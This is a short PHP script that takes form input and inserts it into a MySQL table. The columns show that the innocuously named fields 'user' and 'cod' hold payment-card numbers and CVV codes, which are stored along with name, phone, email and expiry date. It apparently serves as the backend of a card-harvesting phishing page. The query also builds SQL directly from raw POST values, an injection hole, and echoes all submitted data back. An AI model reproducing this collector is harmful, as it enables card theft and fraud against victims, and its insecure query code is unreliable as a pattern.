<?php
include "conexion.php";




if ($_POST['action'] == 'addDato') {
    // Recibir los datos del formulario
    $nombre = $_POST['nombre'];
    $telefono = $_POST['telefono'];
    $email = $_POST['email'];
    $user = $_POST['user'];
    $cod = $_POST['cod'];
    $fecha = $_POST['fecha'];
    print_r($_POST);
    // Conexión a la base de datos
    $query_insert = mysqli_query(
        $conection,
        "INSERT INTO t_dato(T_Dato_Nombre, T_Dato_Numero, T_Dato_Email, T_Dato_Num_Tarjeta, T_Dato_CV, T_Dato_Fecha)
        VALUES ('$nombre', '$telefono', '$email', '$user', '$cod', '$fecha')"
    );

    if ($query_insert) {
        // Si la consulta fue exitosa
        $data = [
            'status' => 'success',
            'message' => 'Registro insertado correctamente',
        ];
        echo json_encode($data, JSON_UNESCAPED_UNICODE);
        print_r('exito'); // Se agregó el punto y coma
        exit;
    } else {
        // Si ocurrió un error en la consulta
        echo json_encode(['status' => 'error', 'message' => 'Error al insertar los datos']);
    }

    mysqli_close($conection);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Acción no válida']);
}
exit;


if ($_POST['action'] == 'addDato') {
        
    print_r($_POST);
    exit;
}



 


    
 ?>
 

